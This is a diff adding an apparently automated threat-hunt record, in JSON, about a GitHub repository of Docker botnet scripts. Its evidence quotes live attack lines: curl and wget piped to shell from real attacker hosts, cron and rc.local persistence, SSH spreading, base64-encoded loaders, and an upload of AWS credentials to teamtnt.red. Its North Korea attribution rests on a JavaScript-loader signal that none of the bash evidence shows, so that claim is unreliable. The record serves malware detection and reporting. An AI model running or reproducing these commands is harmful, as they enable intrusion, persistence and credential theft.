@@ -1,0 +1,194 @@
+{
+  "finding": {
+    "key": "repository:caprico1/docker-botnets",
+    "kind": "repository",
+    "family": "",
+    "id": "caprico1/docker-botnets",
+    "url": "https://github.com/Caprico1/Docker-Botnets",
+    "registry": "github",
+    "owner": "caprico1",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 53,
+    "detection_method": "ioc_search",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "download_exec/fetch-then-exec; download_exec/curl-pipe-shell; obfuscation/base64-decode-exec; exfiltration/secret-exfil",
+    "evidence_locations": "alduro\\alduro.sh:47; alduro\\alduro.sh:308; alduro\\alduro.sh:345; alduro\\alduro.sh:346; alduro\\alduro.sh:361; alduro\\alduro.sh:436; autom_sh\\autom.sh:17; cronb_feb_2023\\init.sh:3; fuhou_borg\\init.sh:25; fuhou_borg\\init.sh:26; lifeengy\\entrypoint.sh:33; lifeengy\\entrypoint.sh:94; lifeengy\\entrypoint.sh:99; teamtnt-cronb\\cronrs.sh:40; teamtnt-cronb\\cronrs.sh:41; teamtnt-cronb\\cronrs.sh:50; teamtnt-cronb\\cronrs.sh:51; teamtnt_oct922\\c.sh:16; teamtnt_oct922\\c.sh:17; teamtnt_oct922\\c.sh:18",
+    "c2_hosts": "teamtnt.red; oracle.zzhreceive.top",
+    "iocs": "teamtnt.red; oracle.zzhreceive.top; http://205.185.113.35/files/lifxvf;; http://205.185.113.35/files/sesa.txt; curl -sL http://205.185.113.35/files/sesa.txt | bash; http://205.185.113.35/files/alduro; curl -sL http://205.185.113.35/files/alduro | bash; curl -L http://205.185.113.35/files/alduro | bash; http://185.164.72.119/log_rotate.bin; wget -q -O- http://185.164.72.119/log_rotate.bin)|sh; https://teamtnt.red/LastPublicRound/index.php;; http://oracle.zzhreceive.top/b2f628/b.sh; wget -q -O- http://oracle.zzhreceive.top/b2f628/b.sh | sh; http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh; curl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh; alduro\\alduro.sh",
+    "matched_signatures": "pool.usxmrpool.com; xmr.bohemianpool.com",
+    "reasons": "Code references OSM IOC(s) ['pool.usxmrpool.com', 'xmr.bohemianpool.com'] in ['known_mining_pools.txt', 'known_mining_pools.txt'] | Tier-2 confirmed (bash score 53)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260910T213825Z",
+    "last_seen": "hunt-20260910T213825Z",
+    "evidence_file": "repositories/caprico1_docker-botnets.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "alduro\\alduro.sh",
+      "line": 47,
+      "category": "download_exec",
+      "rule": "fetch-then-exec",
+      "snippet": "curl -sL -o /tmp/kkk http://205.185.113.35/files/lifxvf; chmod +x /tmp/kkk ; /tmp/kkk ; rm -rf /tmp/kkk"
+    },
+    {
+      "file": "alduro\\alduro.sh",
+      "line": 308,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "curl -sL http://205.185.113.35/files/sesa.txt | bash -s 2>/dev/null;"
+    },
+    {
+      "file": "alduro\\alduro.sh",
+      "line": 345,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "echo \"0,30 * * * * curl -sL http://205.185.113.35/files/alduro | bash -s\" >> ~/cron || true && \\"
+    },
+    {
+      "file": "alduro\\alduro.sh",
+      "line": 346,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "echo \"0,45 * * * * curl -sL http://205.185.113.35/files/sesa.txt | bash -s\" >> ~/cron || true && \\"
+    },
+    {
+      "file": "alduro\\alduro.sh",
+      "line": 361,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "echo \"curl -sL http://205.185.113.35/files/alduro | bash \">>/etc/rc.local"
+    },
+    {
+      "file": "alduro\\alduro.sh",
+      "line": 436,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp \"curl -L http://205.185.113.35/files/alduro | bash -s;\""
+    },
+    {
+      "file": "autom_sh\\autom.sh",
+      "line": 17,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "(curl -s http://185.164.72.119/log_rotate.bin||wget -q -O- http://185.164.72.119/log_rotate.bin)|sh"
+    },
+    {
+      "file": "cronb_feb_2023\\init.sh",
+      "line": 3,
+      "category": "obfuscation",
+      "rule": "base64-decode-exec",
+      "snippet": "Command: chroot /mnt/ /bin/sh -c 'if ! type curl >/dev/null;then apt-get install -y curl;apt-get install -y --reinstall curl;yum clean all;yum install -y curl;yum reinstall -y curl;fi; echo '* * * * *"
+    },
+    {
+      "file": "fuhou_borg\\init.sh",
+      "line": 25,
+      "category": "obfuscation",
+      "rule": "base64-decode-exec",
+      "snippet": "echo IyEvYmluL2Jhc2gKdW5zZXQgSElTVEZJTEUKZXhwb3J0IExDX0FMTD1DCmV4cG9ydCBQQVRIPSRQQVRIOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbjovdXNyL2dhbWVzOi91c3IvbG9jYWwvZ2F"
+    },
+    {
+      "file": "fuhou_borg\\init.sh",
+      "line": 26,
+      "category": "obfuscation",
+      "rule": "base64-decode-exec",
+      "snippet": "echo IyEvYmluL2Jhc2gKdW5zZXQgSElTVEZJTEUKZXhwb3J0IEhPTUU9L3Jvb3QKZXhwb3J0IExDX0FMTD1DCmV4cG9ydCBQQVRIPSRQQVRIOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbjovdXNyL2d"
+    },
+    {
+      "file": "lifeengy\\entrypoint.sh",
+      "line": 33,
+      "category": "obfuscation",
+      "rule": "base64-decode-exec",
+      "snippet": "echo IyEvYmluL2Jhc2gKVEhFUEFUSD0iLyIKZWNobyAnSXlFdlltbHVMMkpoYzJnS0NpTWdJQ0JsWTJodklDSWlPeUJsWTJodklDMWxJQ0pjWlZzeE96TXpPelF4YlNBakl5TWdabTkxYm1RZ1RVbE9SVkl2UVZCUUlFNUJUVVVnSXlNaklGd3dNek5iTUcwaU95Qmx"
+    },
+    {
+      "file": "lifeengy\\entrypoint.sh",
+      "line": 94,
+      "category": "obfuscation",
+      "rule": "base64-decode-exec",
+      "snippet": "echo IyEvYmluL2Jhc2gKUkFTX0tFWT0nc3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFDQVFERk8vRUZRUXhCcVNZK1g5M0VDVFVZUUx4QXpmNXMwcG5hT3U0UlpQbVNHbjE3YjdLaXhhOGoyQktPdS9tTDFudmZCdXVZb2hkaWhkVDdSVmFFSkRQZzd"
+    },
+    {
+      "file": "lifeengy\\entrypoint.sh",
+      "line": 99,
+      "category": "exfiltration",
+      "rule": "secret-exfil",
+      "snippet": "if [ -f /host/root/.aws/credentials ] ; then curl -F \"userfile=@/host/root/.aws/credentials\" https://teamtnt.red/LastPublicRound/index.php; fi"
+    },
+    {
+      "file": "teamtnt-cronb\\cronrs.sh",
+      "line": 40,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "echo 'set backup2 \"\\n\\n\\n*/3 * * * * wget -q -O- http://oracle.zzhreceive.top/b2f628/b.sh | sh\\n\\n\"' >> .dat"
+    },
+    {
+      "file": "teamtnt-cronb\\cronrs.sh",
+      "line": 41,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "echo 'set backup3 \"\\n\\n\\n*/4 * * * * curl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh\\n\\n\"' >> .dat"
+    },
+    {
+      "file": "teamtnt-cronb\\cronrs.sh",
+      "line": 50,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "echo 'set backup2 \"\\n\\n\\n*/3 * * * * root wget -q -O- http://oracle.zzhreceive.top/b2f628/b.sh | sh\\n\\n\"' >> .dat"
+    },
+    {
+      "file": "teamtnt-cronb\\cronrs.sh",
+      "line": 51,
+      "category": "download_exec",
+      "rule": "curl-pipe-shell",
+      "snippet": "echo 'set backup3 \"\\n\\n\\n*/4 * * * * root curl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh\\n\\n\"' >> .dat"
+    },
+    {
+      "file": "teamtnt_oct922\\c.sh",
+      "line": 16,
+      "category": "obfuscation",
+      "rule": "base64-decode-exec",
+      "snippet": "echo 'set backup1 \"\\n\\n\\n*/2 * * * * echo Y2QxIGh0dHA6Ly9raXNzLmEtZG9nLnRvcC9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \\n\\n\"' >> .dat"
+    },
+    {
+      "file": "teamtnt_oct922\\c.sh",
+      "line": 17,
+      "category": "obfuscation",
+      "rule": "base64-decode-exec",
+      "snippet": "echo 'set backup2 \"\\n\\n\\n*/3 * * * * echo d2dldCAtcSAtTy0gaHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash\\n\\n\"' >> .dat"
+    },
+    {
+      "file": "teamtnt_oct922\\c.sh",
+      "line": 18,
+      "category": "obfuscation",
+      "rule": "base64-decode-exec",
+      "snippet": "echo 'set backup3 \"\\n\\n\\n*/4 * * * * echo Y3VybCBodHRwOi8va2lzcy5hLWRvZy50b3AvYjJmNjI4L2Iuc2gK|base64 -d|bash|bash\\n\\n\"' >> .dat"
+    }
+  ],
+  "commit_sha": "2261ce6b05e83efe45df9bd187b0339a0881ef0e",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/caprico1/docker-botnets",
+    "version_info": "all",
+    "threat_description": "Dropper. Payload in alduro\\alduro.sh.\nOutbound: fetch-and-run. It downloads code from a remote host and executes it (alduro\\alduro.sh:47, alduro\\alduro.sh:308).\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: obfuscated-eval-atob-loader.\nFound by GitHub code search for a confirmed malware signature: pool.usxmrpool.com; xmr.bohemianpool.com.\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: alduro\\alduro.sh\n- Outbound: fetch-and-run. It downloads code from a remote host and executes it (alduro\\alduro.sh:47, alduro\\alduro.sh:308).\n- alduro\\alduro.sh:47: downloads a file and runs it\n- alduro\\alduro.sh:308: downloads a remote script and pipes it straight into a shell (+4 more)",
+    "publisher": "caprico1",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "obfuscated-eval-atob-loader",
+      "malware"
+    ],
+    "evidence_references": "https://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/alduro\\alduro.sh#L47\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/alduro\\alduro.sh#L308\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/alduro\\alduro.sh#L345\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/alduro\\alduro.sh#L346\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/alduro\\alduro.sh#L361\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/alduro\\alduro.sh#L436\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/autom_sh\\autom.sh#L17\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/cronb_feb_2023\\init.sh#L3\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/fuhou_borg\\init.sh#L25\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/fuhou_borg\\init.sh#L26\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/lifeengy\\entrypoint.sh#L33\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/lifeengy\\entrypoint.sh#L94\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/lifeengy\\entrypoint.sh#L99\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/teamtnt-cronb\\cronrs.sh#L40\nhttps://github.com/caprico1/docker-botnets/blob/2261ce6b05e83efe45df9bd187b0339a0881ef0e/teamtnt-cronb\\cronrs.sh#L41",
+    "verified_iocs": "teamtnt.red\noracle.zzhreceive.top\nhttp://205.185.113.35/files/lifxvf;\nhttp://205.185.113.35/files/sesa.txt\ncurl -sL http://205.185.113.35/files/sesa.txt | bash\nhttp://205.185.113.35/files/alduro\ncurl -sL http://205.185.113.35/files/alduro | bash\ncurl -L http://205.185.113.35/files/alduro | bash\nhttp://185.164.72.119/log_rotate.bin\nwget -q -O- http://185.164.72.119/log_rotate.bin)|sh\nhttps://teamtnt.red/LastPublicRound/index.php;\nhttp://oracle.zzhreceive.top/b2f628/b.sh\nwget -q -O- http://oracle.zzhreceive.top/b2f628/b.sh | sh\nhttp://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh\ncurl -fsSL http://oracle.zzhreceive.top/b2f628fff19fda999999999/b.sh | sh\nalduro\\alduro.sh",
+    "contributors": [],
+    "first_seen": "2026-09-10T21:38:25Z",
+    "last_seen": "2026-09-10T21:38:25Z"
+  }
+}
